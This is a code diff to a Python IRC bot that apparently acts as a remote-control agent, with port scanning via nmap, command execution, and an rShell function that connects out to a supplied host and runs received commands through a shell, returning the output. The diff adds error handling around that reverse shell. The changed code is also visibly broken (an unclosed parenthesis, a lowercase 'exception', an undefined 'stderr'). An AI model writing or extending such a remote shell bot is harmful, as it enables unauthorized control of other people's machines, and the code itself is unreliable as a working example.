@@ -87,7 +87,7 @@ def connect():
         try: # Try and connect to the IRC server.
             if debugmode: # If debugmode is True, msgs will print to screen.
                 print("Connecting to " + str(server) + ":" + str(port))
-            ircsock.connect((server, port)) # Here we connect to the server.
+            ircsock.connect_ex((server, port)) # Here we connect to the server.
             if useservpass: # If useservpass is True, send serverpass to server to connect.
                 ircsock.send(bytes("PASS "+ serverpass +"\n", "UTF-8")) # Send the server password to connect to password protected IRC server.
             ircsock.send(bytes("USER "+ botnick +" "+ botnick +" "+ botnick +" "+ botnick + " " + botnick + "\n", "UTF-8")) # We are basically filling out a form with this line and saying to set all the fields to the bot nickname.
@@ -112,7 +112,7 @@ def reconnect():
         try:
             if debugmode: # If debugmode is True, msgs will print to screen.
                 print("Reconnecting to " + str(server) + ":" + str(port))
-            ircsock.connect((server, port)) # Here we connect to the server.
+            ircsock.connect_ex((server, port)) # Here we connect to the server.
             if useservpass: # If useservpass is True, send serverpass to server to connect.
                 ircsock.send(bytes("PASS "+ serverpass +"\n", "UTF-8")) # Send the server password to connect to password protected IRC server.
             ircsock.send(bytes("USER "+ botnick +" "+ botnick +" "+ botnick +" "+ botnick + " " + botnick + "\n", "UTF-8")) # We are basically filling out a form with this line and saying to set all the fields to the bot nickname.
@@ -198,23 +198,33 @@ def nmapScan(tgtHost, tgtPort): # Use nmap to scan ports on an ip address with .
     sendmsg((st + " " + tgtHost + " tcp/" +tgtPort + " -" + state), adminname)
 
 def rShell(rsHost, rsPort):
-    rs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    rs.connect((rsHost, rsPort))
-    rs.sendto(str.encode("[*] Connection established!"), (rsHost, rsPort))
-    if debugmode:
-        print("[*] Connection established with " + rsHost + ":" + rsPort + "!")
-    while 1:
-        sdata, saddress = rs.recvfrom(1024).decode("UTF-8")
-        if sdata == "quit":
-            rs.close()
-        if sdata[:2] == "cd":
-            os.chdir(sdata[3:])
-        if len(sdata) > 0:
-            sproc = subprocess.Popen(sdata, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            stdout_value = sproc.stdout.read() + stderr.read()
-            output_str = str(stdout_value)
-            currentWD = os.getcwd() + "> "
-            rs.sendto(str.encode(output_str + currentWD), (rsHost, rsPort))
+    try:
+        rs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        rs.connect((rsHost, rsPort))
+        rs.sendto(str.encode("[*] Connection established!"), (rsHost, rsPort))
+        rsConnected = True
+        if debugmode:
+            print("[*] Connection established with " + rsHost + ":" + rsPort + "!")
+    except socket.error as errmsg:
+        if debugmode:
+            print("Socket connection error: " + str(errmsg)
+    while rsConnected:
+        try:
+            sdata, saddress = rs.recvfrom(1024).decode("UTF-8")
+            if sdata == "quit":
+                rs.close()
+            if sdata[:2] == "cd":
+                os.chdir(sdata[3:])
+            if len(sdata) > 0:
+                sproc = subprocess.Popen(sdata, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                stdout_value = sproc.stdout.read() + stderr.read()
+                output_str = str(stdout_value)
+                currentWD = os.getcwd() + "> "
+                rs.sendto(str.encode(output_str + currentWD), (rsHost, rsPort))
+        except exception as rsexcept:
+            if debugmode:
+                print("Exception: " + rsexcept)
+                rs.close()
     rs.close()
     
 def runcmd(sc):
